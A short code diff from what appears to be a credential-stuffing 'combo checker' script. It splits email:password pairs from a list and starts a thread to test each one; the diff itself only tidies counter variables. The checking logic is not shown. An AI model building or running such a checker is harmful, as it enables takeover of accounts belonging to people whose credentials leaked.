@@ -102,8 +102,7 @@ def credits(IB, B, ldb, C, G, MG, txt, EG, v):
 {C}\n'''
 	sys.stdout.write("\033[F\b\033[F")
 	print(creds)
-c=0        
-v=0
+c=v=0
 
 for combo in db:
 	try:
@@ -111,7 +110,7 @@ for combo in db:
 			combo=combo.replace('|', ':')
 		email=combo.split(':')[0]
 		senha=combo.split(':')[1]
-		c=c+1
+		c+=1
 		thread=threading.Thread(target=checker, args=(IB, B, MG, EG, G, C, email, senha, c, ldb, txt, v))
 		threads.append(thread)
 		thread.start()
